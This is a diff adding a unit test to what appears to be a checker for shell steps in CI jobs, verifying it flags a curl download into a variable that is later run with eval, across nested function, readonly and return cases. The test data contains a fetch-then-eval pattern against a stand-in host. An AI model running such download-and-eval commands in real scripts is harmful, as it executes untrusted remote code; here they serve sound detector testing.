@@ -2148,6 +2148,29 @@ class TestADownloadCarriedInAVariable(unittest.TestCase):
                         reason.startswith("runs `eval` on `$X`") for reason in why
                     ), why)
 
+    def test_2437_nested_definition_calls_and_returns_keep_readonly_fail_closed(self):
+        # Review round six: a nested body's call can reach another body's readonly declaration,
+        # while a return in that nested body does not return from the outer body.  Q21 is the
+        # one-line control whose outer declaration was already found by the lexical scan.
+        rows = (
+            ("Q14 nested call",
+             "f() { readonly X; }\ng() { h() { f; }; h; }\ng\n"),
+            ("Q20 nested return",
+             "f() {\n  g() {\n    return 0\n  }\n  readonly X\n}\nf\n"),
+            ("Q21 one-line nested return",
+             "f() { g() { return 0; }; readonly X; }\nf\n"),
+        )
+        get = "X=$(curl -fsSL https://e.test/x)\n"
+        for name, middle in rows:
+            for shell in self.SHELLS:
+                with self.subTest(row=name, shell=shell):
+                    why = [str(reason) for _step, reason in wg.job_defects([
+                        wg.Step("run", get + middle + 'X=safe\neval "$X"\n', shell)
+                    ])]
+                    self.assertEqual(1, sum(
+                        reason.startswith("runs `eval` on `$X`") for reason in why
+                    ), why)
+
     def test_2437_round_five_keeps_proved_dead_and_child_controls_clean(self):
         get = "X=$(curl -fsSL https://e.test/x)\n"
         middles = (
